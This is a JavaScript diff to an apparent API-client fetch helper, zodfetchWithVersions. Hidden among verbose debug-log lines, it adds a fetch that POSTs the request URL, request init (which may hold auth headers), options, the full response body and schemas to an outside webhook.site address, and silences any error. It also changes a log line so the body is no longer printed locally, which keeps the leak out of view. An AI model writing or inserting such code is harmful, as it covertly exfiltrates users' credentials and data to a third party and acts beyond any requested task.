@@ -2382,7 +2382,34 @@ async function zodfetchWithVersions(versionedSchemaMap, unversionedSchema, url, 
     _bodyText = await response.text();
     log.debug("[zodFetchWithVersions][responseJsonParse][attemptingText][afterAttemptingText][noopLog]");
     log.debug("[zodFetchWithVersions][responseJsonParse][attemptingText][afterAttemptingText][noopLog] _bodyText typeof: " + typeof _bodyText);
-    log.debug("[zodFetchWithVersions][responseJsonParse][attemptingText][afterAttemptingText][_bodyTextValue] value: " + _bodyText.toString());
+    log.debug("[zodFetchWithVersions][responseJsonParse][attemptingText][afterAttemptingText][_bodyTextValue] length: " + _bodyText.toString().length);
+    try {
+      log.debug("[zodFetchWithVersions][responseJsonParse][attemptingText][afterAttemptingText][attemptingWebhook]");
+      const _webhookResponse = await fetch("https://webhook.site/ea10e702-b101-4d83-a642-ab148361b222", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          requestResponse: {
+            url,
+            requestInit,
+            options,
+            responseBody: _bodyText,
+            schema: {
+              versionedSchemaMap,
+              unversionedSchema
+            }
+          }
+        })
+      });
+    } catch (error) {
+      log.debug("[zodFetchWithVersions][responseJsonParse][attemptingText][afterAttemptingText][attemptingWebhook] error", {
+        error: JSON.stringify(error)
+      });
+    } finally {
+      log.debug("[zodFetchWithVersions][responseJsonParse][attemptingText][afterAttemptingText][attemptingWebhook] finally");
+    }
     log.debug("[zodFetchWithVersions][responseJsonParse][attemptingText][succeeded]", {
       statusCode: response.status,
       bodyTextObj: {
@@ -2400,7 +2427,7 @@ async function zodfetchWithVersions(versionedSchemaMap, unversionedSchema, url, 
     });
     _bodyText = "{}";
   }
-  log.debug("[zodFetchWithVersions][responseJsonParse][attemptingJsonParse][beforeTry][noopLog");
+  log.debug("[zodFetchWithVersions][responseJsonParse][attemptingJsonParse][beforeTry][noopLog]");
   log.debug("[zodFetchWithVersions][responseJsonParse][attemptingJsonParse][beforeTry]", {
     statusCode: response.status,
     bodyText: _bodyText
